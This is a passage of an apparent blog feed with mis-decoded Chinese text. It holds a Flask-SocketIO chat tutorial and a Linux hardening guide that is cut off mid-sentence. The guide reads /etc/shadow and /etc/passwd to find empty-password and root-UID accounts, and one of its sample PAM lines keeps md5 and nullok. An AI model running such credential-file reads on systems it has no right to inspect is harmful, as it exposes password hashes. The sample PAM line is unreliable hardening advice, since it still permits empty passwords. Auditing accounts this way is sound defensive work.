    <content type="html"><![CDATA[<h1 id="åŸºäºFlask-websocketå®ç°åœ¨çº¿èŠå¤©ç³»ç»Ÿ"><a href="#åŸºäºFlask-websocketå®ç°åœ¨çº¿èŠå¤©ç³»ç»Ÿ" class="headerlink" title="åŸºäºFlask+websocketå®ç°åœ¨çº¿èŠå¤©ç³»ç»Ÿ"></a>åŸºäºFlask+websocketå®ç°åœ¨çº¿èŠå¤©ç³»ç»Ÿ</h1><p>â€‹          webå¼€å‘å°±æ˜¯åŸºäºæµè§ˆå™¨è¿›è¡Œäººæœºäº¤äº’ï¼Œå½“è®¿å®¢ç™»å½•åˆ°æŒ‡å®šç½‘å€åï¼Œä¸ä»…å¯ä»¥çœ‹åˆ°æµè§ˆå™¨æ¸²æŸ“çš„ç”»é¢ï¼ŒåŒæ—¶è¿˜å¯ä»¥ä¸åå°è¿›è¡Œä¸€äº›æ“ä½œï¼Œå†é€šè¿‡æµè§ˆå™¨è¿”å›åå°æœåŠ¡å™¨å¤„ç†çš„ç»“æœï¼Œè¿™æ®µæ—¶é—´ä¸€ç›´åœ¨æ‘¸ç´¢åˆ©ç”¨flaskæ¡†æ¶æ¥åšç‚¹æœ‰æ„æ€çš„äº‹</p><h2 id="ä»€ä¹ˆæ˜¯Flaskï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯Flaskï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯Flaskï¼Ÿ"></a>ä»€ä¹ˆæ˜¯Flaskï¼Ÿ</h2><p><code>Flask</code>æ˜¯ä¸€ä¸ªè½»é‡çº§çš„ Python web å¼€å‘æ¡†æ¶ï¼Œå®ƒä¸ºå¼€å‘è€…æä¾›äº†ä¸€ä¸ªç®€å•ã€ç›´è§‚çš„æ–¹å¼æ¥åˆ›å»º web åº”ç”¨ã€‚ç”±äºå…¶â€œå¾®â€ç‰¹æ€§ï¼Œä½ å¯ä»¥ä»ä¸€ä¸ªç®€å•çš„å•æ–‡ä»¶åº”ç”¨å¼€å§‹ï¼Œç„¶åæ ¹æ®éœ€è¦å¢åŠ æ›´å¤šåŠŸèƒ½ã€‚</p><h2 id="Websockets-å’Œ-Flask-SocketIO"><a href="#Websockets-å’Œ-Flask-SocketIO" class="headerlink" title="Websockets å’Œ Flask-SocketIO"></a>Websockets å’Œ Flask-SocketIO</h2><p><code>Websockets</code> æ˜¯ä¸€ä¸ªç½‘ç»œé€šä¿¡åè®®ï¼Œå…è®¸æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´è¿›è¡ŒåŒå‘å®æ—¶é€šä¿¡ã€‚ä¸ä¼ ç»Ÿçš„ HTTP è¯·æ±‚ç›¸æ¯”ï¼ŒWebsockets æä¾›äº†ä¸€ä¸ªæŒä¹…çš„è¿æ¥ï¼Œä½¿å¾—æ•°æ®èƒ½å¤Ÿå®æ—¶ã€é«˜æ•ˆåœ°åœ¨åŒæ–¹ä¹‹é—´æµåŠ¨ã€‚<br><code>Flask-SocketIO</code> åˆ™æ˜¯ä¸€ä¸ª Flask æ’ä»¶ï¼Œå®ƒä½¿å¾—åœ¨ Flask åº”ç”¨ä¸­é›†æˆ Websockets å˜å¾—éå¸¸ç®€å•ã€‚ä¸ä»…å¦‚æ­¤ï¼Œå®ƒè¿˜æä¾›äº†ä¸€ç³»åˆ—çš„é«˜çº§åŠŸèƒ½ï¼Œå¦‚å¹¿æ’­ã€å‘½åç©ºé—´å’Œæˆ¿é—´æ”¯æŒï¼Œä½¿å¾—åˆ›å»ºå¤æ‚çš„å®æ—¶åº”ç”¨å˜å¾—è½»è€Œæ˜“ä¸¾ã€‚</p><h2 id="å¤§æ¦‚åŠŸèƒ½"><a href="#å¤§æ¦‚åŠŸèƒ½" class="headerlink" title="å¤§æ¦‚åŠŸèƒ½"></a>å¤§æ¦‚åŠŸèƒ½</h2><p>ç”¨æˆ·ç®¡ç†åŠŸèƒ½ï¼šåŒ…æ‹¬è´¦å·ç™»å½•ã€æ³¨å†Œç­‰åŠŸèƒ½ã€‚</p><p>å¥½å‹ç®¡ç†åŠŸèƒ½ï¼šå…è®¸ç”¨æˆ·æ·»åŠ å’Œåˆ é™¤å¥½å‹ã€‚</p><p>å³æ—¶èŠå¤©åŠŸèƒ½ï¼šç”¨æˆ·å¯ä»¥è¿›è¡Œå®æ—¶çš„èŠå¤©ï¼Œå¹¶ä¸”é€šè¿‡@ç”¨æˆ·å å¯ä»¥è¿›è¡Œç§èŠã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;/&#x27;</span>ï¼ˆé¦–é¡µï¼‰ï¼šå¦‚æœç”¨æˆ·æœªç™»å½•ï¼Œåˆ™é‡å®šå‘åˆ°ç™»å½•é¡µé¢ï¼›å¦åˆ™ï¼Œé‡å®šå‘åˆ°èŠå¤©é¡µé¢ã€‚</span><br><span class="line"><span class="string">&#x27;/login&#x27;</span>ï¼šå¤„ç†ç”¨æˆ·ç™»å½•ï¼Œæ£€æŸ¥å‡­æ®æ˜¯å¦ä¸æ•°æ®åº“åŒ¹é…ã€‚</span><br><span class="line"><span class="string">&#x27;/chat&#x27;</span>ï¼šå¦‚æœç”¨æˆ·å·²ç™»å½•ï¼Œåˆ™æ¸²æŸ“èŠå¤©é¡µé¢ï¼›å¦åˆ™ï¼Œé‡å®šå‘åˆ°ç™»å½•é¡µé¢ã€‚</span><br><span class="line"><span class="string">&#x27;/logout&#x27;</span>ï¼šé€šè¿‡åˆ é™¤ç”¨æˆ·çš„ä¼šè¯æ¥æ³¨é”€ç”¨æˆ·ã€‚</span><br><span class="line"><span class="string">&#x27;/register&#x27;</span>ï¼šå¤„ç†ç”¨æˆ·æ³¨å†Œï¼Œæ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å”¯ä¸€ï¼Œå¹¶å°†ç”¨æˆ·æ·»åŠ åˆ°æ•°æ®åº“ä¸­ã€‚</span><br><span class="line">å®šä¹‰WebSocketå¤„ç†ç¨‹åºï¼š</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;message&#x27;</span>ï¼šå¤„ç†ä¼ å…¥çš„èŠå¤©æ¶ˆæ¯å¹¶å°†å…¶å¹¿æ’­åˆ°é€‚å½“çš„æˆ¿é—´ã€‚</span><br><span class="line"><span class="string">&#x27;join&#x27;</span>ï¼šå¤„ç†ç”¨æˆ·åŠ å…¥èŠå¤©æˆ¿é—´å¹¶æ›´æ–°æˆ¿é—´ä¸­åœ¨çº¿ç”¨æˆ·çš„åˆ—è¡¨ã€‚</span><br><span class="line"><span class="string">&#x27;leave&#x27;</span>ï¼šå¤„ç†ç”¨æˆ·ç¦»å¼€èŠå¤©æˆ¿é—´å¹¶æ›´æ–°æˆ¿é—´ä¸­åœ¨çº¿ç”¨æˆ·çš„åˆ—è¡¨ã€‚</span><br><span class="line">åœ¨<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:éƒ¨åˆ†ï¼Œåˆ›å»ºæ•°æ®åº“è¡¨å¹¶è¿è¡Œåº”ç”¨ç¨‹åºï¼Œå…è®¸WebSocketé€šä¿¡ä»¥å®æ—¶å¤„ç†èŠå¤©æ¶ˆæ¯ã€‚</span><br></pre></td></tr></table></figure><h2 id="åˆ›å»ºåœ¨çº¿èŠå¤©ç³»ç»Ÿ"><a href="#åˆ›å»ºåœ¨çº¿èŠå¤©ç³»ç»Ÿ" class="headerlink" title="åˆ›å»ºåœ¨çº¿èŠå¤©ç³»ç»Ÿ"></a>åˆ›å»ºåœ¨çº¿èŠå¤©ç³»ç»Ÿ</h2><ol><li>å®‰è£…å¿…è¦çš„åº“ï¼š</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Flask flask-socketio</span><br></pre></td></tr></table></figure><ol start="2"><li>åˆå§‹åŒ–Flask åº”ç”¨å¹¶é›†æˆSocketIOï¼š</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, flash, jsonify</span><br><span class="line"><span class="keyword">from</span> flask_socketio <span class="keyword">import</span> SocketIO, join_room, leave_room, emit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">socketio = SocketIO(app)</span><br></pre></td></tr></table></figure><ol start="3"><li>å®šä¹‰ç®€å•çš„è·¯ç”±ä¸€å‘ˆç°èŠå¤©å®¤çš„å‰ç«¯ç•Œé¢:</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;chat&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br></pre></td></tr></table></figure><ol start="4"><li>ä¸ºèŠå¤©å®¤äº‹ä»¶ï¼ˆå¦‚åŠ å…¥ã€å‘é€æ¶ˆæ¯å’Œç¦»å¼€ï¼‰æ·»åŠ  SocketIO äº‹ä»¶å¤„ç†å‡½æ•°ï¼š</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@socketio.on(<span class="params"><span class="string">&#x27;join&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">join</span>(<span class="params">data</span>):</span><br><span class="line">    room = data[<span class="string">&#x27;room&#x27;</span>]</span><br><span class="line">    join_room(room)</span><br><span class="line">    online_users.add(session[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line">    emit(<span class="string">&#x27;update_online_users&#x27;</span>, &#123;<span class="string">&#x27;online_users&#x27;</span>: <span class="built_in">list</span>(online_users)&#125;, room=room)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@socketio.on(<span class="params"><span class="string">&#x27;leave&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave</span>(<span class="params">data</span>):</span><br><span class="line">    room = data[<span class="string">&#x27;room&#x27;</span>]</span><br><span class="line">    leave_room(room)</span><br><span class="line">    online_users.remove(session[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line">    emit(<span class="string">&#x27;update_online_users&#x27;</span>, &#123;<span class="string">&#x27;online_users&#x27;</span>: <span class="built_in">list</span>(online_users)&#125;, room=room)</span><br></pre></td></tr></table></figure><ol start="5"><li>æœ€åå¯åŠ¨flaskåº”ç”¨ï¼š</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> app.app_context():</span><br><span class="line">        db.create_all()</span><br><span class="line">        socketio.run(app, debug=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># socketio.run(app, host=&#x27;0.0.0.0&#x27;, port=80)</span></span><br></pre></td></tr></table></figure><h2 id="é¡¹ç›®å±•ç¤º"><a href="#é¡¹ç›®å±•ç¤º" class="headerlink" title="é¡¹ç›®å±•ç¤º"></a>é¡¹ç›®å±•ç¤º</h2><p>ç”±äºç¯‡å¹…æœ‰é™ï¼Œå¦‚éœ€ç³»ç»Ÿå®Œæ•´ä»£ç ï¼Œå¯ç‚¹å‡»ä¸»é¡µæ·»åŠ QQè·å–</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230919163904624.png" alt="image-20230919163904624"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å€ŸåŠ© Flask å’Œ Flask-SocketIOï¼Œä½ å¯ä»¥è½»æ¾åˆ›å»ºä¸€ä¸ªåŠŸèƒ½é½å…¨çš„åœ¨çº¿èŠå¤©å®¤ã€‚è€Œ Websockets ä¿è¯äº†æ•°æ®åœ¨æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´çš„å®æ—¶äº¤äº’ï¼Œä¸ºç”¨æˆ·æä¾›äº†ä¸€ä¸ªæ— ç¼çš„ä½“éªŒã€‚è¿™åªæ˜¯ä¸€ä¸ªåŸºç¡€æ¡ˆä¾‹ï¼Œé€šè¿‡è¯¥æ¡ˆä¾‹æˆ‘ä»¬å¯ä»¥å°è¯•æ‰©å±•å‡ºå¾ˆå¤šåŠŸèƒ½ï¼Œæ¯”å¦‚åœ¨çº¿å®¢æœç­‰ï¼Œå¹¶ä¸æ•°æ®åº“ç­‰æŠ€æœ¯ç»“åˆèµ·æ¥ï¼Œéƒ¨ç½²åœ¨æœåŠ¡å™¨ä¸Šå®ç°ä¸€ä¸ªè‡ªå·±çš„é€šä¿¡ç³»ç»Ÿã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;åŸºäºFlask-websocketå®ç°åœ¨çº¿èŠå¤©ç³»ç»Ÿ&quot;&gt;&lt;a href=&quot;#åŸºäºFlask-websocketå®ç°åœ¨çº¿èŠå¤©ç³»ç»Ÿ&quot; class=&quot;headerlink&quot; title=&quot;åŸºäºFlask+websocketå®ç°åœ¨çº¿èŠå¤©ç³»ç»Ÿ&quot;&gt;&lt;/a&gt;åŸºäºFlask+web</summary>
      
    
    
    
    <category term="Python" scheme="https://iahzl.github.io/categories/Python/"/>
    
    
    <category term="Python" scheme="https://iahzl.github.io/tags/Python/"/>
    
    <category term="html" scheme="https://iahzl.github.io/tags/html/"/>
    
    <category term="javascript" scheme="https://iahzl.github.io/tags/javascript/"/>
    
    <category term="css" scheme="https://iahzl.github.io/tags/css/"/>
    
    <category term="flask" scheme="https://iahzl.github.io/tags/flask/"/>
    
    <category term="websocket" scheme="https://iahzl.github.io/tags/websocket/"/>
    
  </entry>
  
  <entry>
    <title>Linuxå®‰å…¨åŸºçº¿æ£€æŸ¥åŠåŠ å›º</title>
    <link href="https://iahzl.github.io/Linux%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF%E6%A3%80%E6%9F%A5%E5%8F%8A%E5%8A%A0%E5%9B%BA/"/>
    <id>https://iahzl.github.io/Linux%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF%E6%A3%80%E6%9F%A5%E5%8F%8A%E5%8A%A0%E5%9B%BA/</id>
    <published>2023-08-24T09:03:37.000Z</published>
    <updated>2023-08-24T09:06:45.198Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linuxå®‰å…¨åŸºçº¿æ£€æŸ¥åŠåŠ å›º"><a href="#Linuxå®‰å…¨åŸºçº¿æ£€æŸ¥åŠåŠ å›º" class="headerlink" title="Linuxå®‰å…¨åŸºçº¿æ£€æŸ¥åŠåŠ å›º"></a>Linuxå®‰å…¨åŸºçº¿æ£€æŸ¥åŠåŠ å›º</h1><h2 id="ç³»ç»ŸåŠ å›ºæ£€æŸ¥ç‚¹"><a href="#ç³»ç»ŸåŠ å›ºæ£€æŸ¥ç‚¹" class="headerlink" title="ç³»ç»ŸåŠ å›ºæ£€æŸ¥ç‚¹"></a>ç³»ç»ŸåŠ å›ºæ£€æŸ¥ç‚¹</h2><ul><li>è´¦å·å®‰å…¨<ul><li>ç©ºå£ä»¤ç”¨æˆ·</li><li>umaskå€¼çš„é‡è¦æ€§</li><li>suçš„é™åˆ¶</li><li>å¯†ç æœ€é•¿æœ‰æ•ˆæœŸ</li><li>å¯†ç å¤æ‚æ€§</li></ul></li><li>ç³»ç»Ÿå®‰å…¨åŸºçº¿<ul><li>æ£€æŸ¥grubå¯†ç </li><li>ä¿®æ”¹å†…æ ¸ç½‘ç»œå‚æ•°</li><li>ç¦æ­¢Control-Alt-Deleteé”®ç›˜å…³é—­å‘½ä»¤</li><li>ä¿®æ”¹å‘½ä»¤å†å²è®°å½•æ¡ç›®æ•°ä»¥åŠæ—¶é—´æ ‡ç­¾</li><li>è®¾ç½®ç™»å½•è¶…æ—¶æ—¶é—´</li></ul></li></ul><h3 id="ç©ºå£ä»¤ç”¨æˆ·"><a href="#ç©ºå£ä»¤ç”¨æˆ·" class="headerlink" title="ç©ºå£ä»¤ç”¨æˆ·"></a>ç©ºå£ä»¤ç”¨æˆ·</h3><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230823153358927.png" alt="image-20230823153358927"></p><p>åˆ©ç”¨<code>cat /etc/shadow</code>æŒ‡ä»¤ï¼Œä¸Šå›¾<strong>kali</strong>åçš„ä¸ºç”¨æˆ·çš„å¯†ç ï¼ŒæŸ¥çœ‹ç”¨æˆ·æ˜¯å¦å­˜åœ¨ç©ºå£ä»¤ï¼Œä½†æ˜¯ï¼Œè¿™ç§æ–¹æ³•å®¹æ˜“çœ‹æ¼ç›¸å…³ä¿¡æ¯</p><ol><li>ç©ºå£ä»¤å’Œéšè—ç®¡ç†å‘˜æ£€æŸ¥</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$1</span> ç”¨æˆ·å  </span><br><span class="line"><span class="variable">$2</span> å¯†ç å ç”¨ç¬¦</span><br><span class="line"><span class="variable">$3</span> UID</span><br><span class="line"><span class="variable">$4</span> ç»„</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230823160310527.png" alt="image-20230823160310527"></p><p>ä½¿ç”¨å‘½ä»¤<code>awk -F: &#39;($2==&quot;&quot;)&#123;print $1&#125;&#39; /etc/shadow</code>æŸ¥çœ‹ç©ºå£ä»¤è´¦å·  <strong>$1ä¸ºç¬¬ä¸€ä¸ªå­—æ®µå³ç”¨æˆ·å</strong></p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230823154237648.png" alt="image-20230823154237648"></p><p>ä½¿ç”¨å‘½ä»¤<code>awk -F: &#39;($3==0)&#123;print $1&#125;&#39; /etc/passwd</code>æŸ¥çœ‹UIDä¸º0çš„è´¦å·</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230823161402210.png" alt="image-20230823161402210"></p><h3 id="umaskå€¼çš„é‡è¦æ€§"><a href="#umaskå€¼çš„é‡è¦æ€§" class="headerlink" title="umaskå€¼çš„é‡è¦æ€§"></a>umaskå€¼çš„é‡è¦æ€§</h3><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230823162331670.png" alt="image-20230823162331670"></p><p><code>umask</code>ä½œç”¨ï¼šä¸»è¦æ˜¯é’ˆå¯¹æ–°åˆ›å»ºçš„æ–‡ä»¶çš„æƒé™ç®¡ç†ï¼Œæ¯”å¦‚ä½ umaskè®¾ç½®çš„æ˜¯022 é‚£ä½ åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶é»˜è®¤çš„æƒé™å°±æ˜¯644 (644çš„äºŒè¿›åˆ¶ 110 010 010)å±ä¸»è¯»å†™ åŒç»„è¯» å…¶ä»–ç”¨æˆ·è¯»</p><p><strong>rwx  &#x3D;&gt;  r&#x3D;read(è¯»å–) w&#x3D;write(å†™å…¥) x(exe)(æ‰§è¡Œ)</strong></p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230823162541325.png" alt="image-20230823162541325"></p><h3 id="é™åˆ¶ç”¨æˆ·ä½¿ç”¨su"><a href="#é™åˆ¶ç”¨æˆ·ä½¿ç”¨su" class="headerlink" title="é™åˆ¶ç”¨æˆ·ä½¿ç”¨su"></a>é™åˆ¶ç”¨æˆ·ä½¿ç”¨su</h3><p>ä½¿ç”¨å‘½ä»¤<code>vim /etc/pasm.d/su</code> ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå»é™¤ç¬¬å…­è¡Œçš„æ³¨é‡Šç¬¦å·ï¼Œè¡¨ç¤ºåœ¨wheelç»„ä¸­çš„ç”¨æˆ·æ‰èƒ½å¤ŸæˆåŠŸä½¿ç”¨suå‘½ä»¤ï¼Œå…¶ä»–ç”¨æˆ·æ— æ³•ä½¿ç”¨ã€‚å¦‚æœéœ€è¦å…¶ä»–ç»„æ”¯æŒè¯¥åŠŸèƒ½å¯ä»¥æ·»åŠ å†…å®¹ã€‚</p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230823164802724.png" alt="image-20230823164802724" style="zoom:80%;" /><p>ä¾‹å¦‚ï¼šåªå…è®¸testç»„ç”¨æˆ·suåˆ°root</p><p><code>auth required pam_wheel.so group=test</code></p><h3 id="å¯†ç æœ€é•¿æœ‰æ•ˆæœŸ"><a href="#å¯†ç æœ€é•¿æœ‰æ•ˆæœŸ" class="headerlink" title="å¯†ç æœ€é•¿æœ‰æ•ˆæœŸ"></a>å¯†ç æœ€é•¿æœ‰æ•ˆæœŸ</h3><p>åœ¨æ–‡ä»¶<code>/etc/login.defs</code> ä¸­è¿›è¡Œè®¾ç½®å¦‚ä¸‹å‚æ•°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PASS_MAX_DAYS   180  <span class="comment">#å¯†ç æœ€é•¿è¿‡æœŸå¤©æ•°</span></span><br><span class="line">PASS_MIN_DAYS   30  <span class="comment">#å¯†ç æœ€å°è¿‡æœŸå¤©æ•°</span></span><br><span class="line">PASS_MIN_LEN    12  <span class="comment">#å¯†ç æœ€å°é•¿åº¦</span></span><br><span class="line">PASS_WARN_AGE   20   <span class="comment">#å¯†ç è¿‡æœŸè­¦å‘Šå¤©æ•°</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230824153717146.png" alt="image-20230824153717146"></p><h3 id="å¯†ç å¤æ‚æ€§"><a href="#å¯†ç å¤æ‚æ€§" class="headerlink" title="å¯†ç å¤æ‚æ€§"></a>å¯†ç å¤æ‚æ€§</h3><ul><li>æ–‡ä»¶ç¼–è¾‘<ul><li><code>/etc/pam.d/system-auth</code> </li><li>Debianç³»åˆ—ç³»ç»Ÿï¼š<code>/etc/pam.d/common-password</code></li></ul></li></ul><h4 id="å¯†ç å†å²æˆ–æ‹’ç»é‡å¤ä½¿ç”¨å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#å¯†ç å†å²æˆ–æ‹’ç»é‡å¤ä½¿ç”¨å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="å¯†ç å†å²æˆ–æ‹’ç»é‡å¤ä½¿ç”¨å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ"></a>å¯†ç å†å²æˆ–æ‹’ç»é‡å¤ä½¿ç”¨å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ</h4><p>è¿™ä¸ªå‚æ•°æ§åˆ¶å¯†ç å†å²ã€‚å®ƒè®°å½•æ›¾ç»ä½¿ç”¨è¿‡çš„å¯†ç ï¼ˆç¦æ­¢ä½¿ç”¨çš„æ›¾ç”¨å¯†ç çš„ä¸ªæ•°ï¼‰ã€‚å½“ç”¨æˆ·è®¾ç½®æ–°çš„å¯†ç æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥å¯†ç å†å²ï¼Œå¦‚æœä»–ä»¬è¦è®¾ç½®çš„å¯†ç æ˜¯ä¸€ä¸ªæ›¾ç»ä½¿ç”¨è¿‡çš„æ—§å¯†ç ï¼Œå°†ä¼šå‘å‡ºè­¦å‘Šæç¤ºã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ <code>/etc/pam.d/system-auth</code> æ–‡ä»¶ä¸­è®¾ç½®ã€‚æˆ‘è®¾ç½®å¯†ç å†å²ä¸º 5ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vi /etc/pam.d/system-auth</span></span><br><span class="line">password  sufficient  pam_unix.so md5 shadow nullok try_first_pass use_authtok remember=5</span><br></pre></td></tr></table></figure><h4 id="å¯†ç æœ€å°é•¿åº¦æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#å¯†ç æœ€å°é•¿åº¦æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="å¯†ç æœ€å°é•¿åº¦æ˜¯ä»€ä¹ˆï¼Ÿ"></a>å¯†ç æœ€å°é•¿åº¦æ˜¯ä»€ä¹ˆï¼Ÿ</h4><p>è¿™ä¸ªå‚æ•°è¡¨ç¤ºå¯†ç çš„æœ€å°é•¿åº¦ã€‚å½“ç”¨æˆ·è®¾ç½®æ–°å¯†ç æ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥è¿™ä¸ªå‚æ•°ï¼Œå¦‚æœæ–°è®¾çš„å¯†ç é•¿åº¦å°äºè¿™ä¸ªå‚æ•°è®¾ç½®çš„å€¼ï¼Œä¼šæ”¶åˆ°è­¦å‘Šæç¤ºã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ <code>/etc/pam.d/system-auth</code> æ–‡ä»¶ä¸­è®¾ç½®ã€‚æˆ‘è®¾ç½®æœ€å°å¯†ç é•¿åº¦ä¸º 12ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vi /etc/pam.d/system-auth</span></span><br><span class="line">password  requisite   pam_cracklib.so try_first_pass retry=3 minlen=12</span><br></pre></td></tr></table></figure><p><code>try_first_pass retry=3</code>ï¼šåœ¨å¯†ç è®¾ç½®äº¤äº’ç•Œé¢ï¼Œç”¨æˆ·æœ‰ 3 æ¬¡æœºä¼šé‡è®¾å¯†ç ã€‚</p><h4 id="è®¾ç½®æœ€å°‘çš„å¤§å†™å­—æ¯ä¸ªæ•°ï¼Ÿ"><a href="#è®¾ç½®æœ€å°‘çš„å¤§å†™å­—æ¯ä¸ªæ•°ï¼Ÿ" class="headerlink" title="è®¾ç½®æœ€å°‘çš„å¤§å†™å­—æ¯ä¸ªæ•°ï¼Ÿ"></a>è®¾ç½®æœ€å°‘çš„å¤§å†™å­—æ¯ä¸ªæ•°ï¼Ÿ</h4><p>è¿™ä¸ªå‚æ•°è¡¨ç¤ºå¯†ç ä¸­è‡³å°‘éœ€è¦çš„å¤§å†™å­—æ¯çš„ä¸ªæ•°ã€‚è¿™äº›æ˜¯å¯†ç å¼ºåº¦å‚æ•°ï¼Œå¯ä»¥è®©å¯†ç æ›´å¥å£®ã€‚å½“ç”¨æˆ·è®¾ç½®æ–°å¯†ç æ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥è¿™ä¸ªå‚æ•°ï¼Œå¦‚æœå¯†ç ä¸­æ²¡æœ‰å¤§å†™å­—æ¯ï¼Œä¼šæ”¶åˆ°è­¦å‘Šæç¤ºã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ <code>/etc/pam.d/system-auth</code> æ–‡ä»¶ä¸­è®¾ç½®ã€‚æˆ‘è®¾ç½®å¯†ç ï¼ˆä¸­çš„å¤§å†™å­—æ¯ï¼‰çš„æœ€å°é•¿åº¦ä¸º 1 ä¸ªå­—æ¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vi /etc/pam.d/system-auth</span></span><br><span class="line">password   requisite   pam_cracklib.so try_first_pass retry=3 minlen=12 ucredit=-1</span><br></pre></td></tr></table></figure><h4 id="è®¾ç½®æœ€å°‘çš„å°å†™å­—æ¯ä¸ªæ•°ï¼Ÿ"><a href="#è®¾ç½®æœ€å°‘çš„å°å†™å­—æ¯ä¸ªæ•°ï¼Ÿ" class="headerlink" title="è®¾ç½®æœ€å°‘çš„å°å†™å­—æ¯ä¸ªæ•°ï¼Ÿ"></a>è®¾ç½®æœ€å°‘çš„å°å†™å­—æ¯ä¸ªæ•°ï¼Ÿ</h4><p>è¿™ä¸ªå‚æ•°è¡¨ç¤ºå¯†ç ä¸­è‡³å°‘éœ€è¦çš„å°å†™å­—æ¯çš„ä¸ªæ•°ã€‚è¿™äº›æ˜¯å¯†ç å¼ºåº¦å‚æ•°ï¼Œå¯ä»¥è®©å¯†ç æ›´å¥å£®ã€‚å½“ç”¨æˆ·è®¾ç½®æ–°å¯†ç 